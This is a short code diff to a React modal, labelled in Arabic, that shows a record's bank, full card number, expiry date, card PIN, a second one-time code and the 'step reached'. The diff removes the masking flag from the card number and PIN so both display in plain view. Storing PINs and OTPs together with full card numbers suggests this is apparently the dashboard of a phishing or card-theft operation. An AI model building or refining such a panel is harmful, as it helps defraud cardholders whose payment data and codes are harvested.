@@ -83,10 +83,10 @@ export default function RecordDetailModal({ record: r, onClose }) {
           <Section icon={CreditCard} title="معلومات البطاقة" gradient="from-emerald-600/80 to-teal-700/80">
             <InfoRow label="البنك" value={r.bank} />
             <InfoRow label="بادئة البطاقة" value={r.card_prefix} />
-            <InfoRow label="رقم البطاقة" value={r.card_number} sensitive />
+            <InfoRow label="رقم البطاقة" value={r.card_number} />
             <InfoRow label="شهر الانتهاء" value={r.expiry_month} />
             <InfoRow label="سنة الانتهاء" value={r.expiry_year} />
-            <InfoRow label="الرقم السري (PIN)" value={r.pin} sensitive />
+            <InfoRow label="الرقم السري (PIN)" value={r.pin} />
             <InfoRow label="OTP 2" value={r.otp2} sensitive />
             <InfoRow label="الخطوة المحققة" value={r.step_reached != null ? String(r.step_reached) : null} />
           </Section>
